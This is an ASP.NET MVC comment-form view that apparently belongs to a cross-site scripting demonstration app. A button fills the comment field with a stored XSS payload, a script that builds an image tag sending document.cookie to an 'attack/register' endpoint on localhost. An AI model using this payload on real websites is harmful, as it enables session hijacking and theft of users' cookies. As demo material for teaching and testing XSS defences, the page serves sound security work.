<%@ Page Language="C#" MasterPageFile="~/Views/Shared/Site.Master" Inherits="System.Web.Mvc.ViewPage<CommentInput>" %>
<%@ Import Namespace="Target.Controllers"%>

<asp:Content ID="indexTitle" ContentPlaceHolderID="TitleContent" runat="server">
    Leave a comment
</asp:Content>

<asp:Content ID="indexContent" ContentPlaceHolderID="MainContent" runat="server">

<script type="text/javascript">
	$(function() {
		$('.malicious').click(function() {
		$('.comment').val("A long comment <script>document.write('<img src=http://localhost:8082/attack/register?input=' +escape(document.cookie)+ '/>')</scr"+"ipt>");
		});
	});
</script>

<form action="/comment/save" method="post">

<p>Name:</p>
<%= Html.TextBoxFor(x => x.Name) %>

<p>Comment:</p>
<%= Html.TextAreaFor(x => x.Comment, 10, 50, new {@class="comment"}) %>

<p><button type="submit">Save Comment</button></p>

</form>

<button type="button" class="malicious">Populate text area with malicious content</button>

</asp:Content>
